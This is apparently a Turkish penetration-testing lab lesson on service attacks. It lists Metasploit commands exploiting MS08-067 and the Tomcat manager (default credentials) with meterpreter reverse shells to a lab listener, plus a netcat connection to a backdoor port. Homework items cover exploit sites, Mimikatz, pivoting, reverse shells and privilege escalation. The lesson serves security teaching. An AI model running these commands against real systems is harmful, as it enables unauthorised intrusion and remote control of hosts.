# Servis Saldırıları

## Komutlar

```
msfconsole
db_rebuild_cache
search ms08
use exploit/windows/smb/ms08_067_netapi
show options
set rhost 10.0.3.6
set payload windows/meterpreter/reverse_tcp
set lhost 10.0.3.5
exploit
ls
pwd
getuid
screenshot
search tomcat
use auxiliary/scanner/http/tomcat_mgr_login
show options
set rhost 10.0.3.7
set rport 8180
use exploit/multi/http/tomcat_mgr_deploy
show options
set rhost 10.0.3.7
set rport 8180
set username tomcat
set password tomcat
set payload java/meterpreter/reverse_tcp
set lhost 10.0.3.5
nc 10.0.3.7 1524
```

## Ödevler

- Exploit-db, 0day.today benzeri siteleri araştırınız ve düzenli olarak takip ediniz.
- Açıklıkların paylaşıldığı diğer plaformları araştırınız.
- Nessus veya openvas aracını çalıştırınız ve lab makineleri üzerinde test ediniz.
- Mimikatz aracını araştırınız.
- Metasploit komutlarını inceleyiniz. Pivot işleminin nasıl yapıldığını araştırınız.
- Metasploit aracı dışında exploit sitelerinden seçtiğiniz bir exploiti indirip çalıştırınız.
- Reverse ile bind shell almanın farklarını öğreniniz.
- Sunucudan shell almanın farklı yollarını araştırınız.
- Linux sunuculardan alınabilecek reverse shell yollarını araştırınız.
- Linux sunuculara erişim sağlandıktan sonra yetki yükseltmenin nasıl yapılacağını araştırınız.
- Metasploitable dağıtımından normal yetkili shell aldıktan sonra root yetkisine çıkaracak şekilde exploit etmeyi deneyiniz.
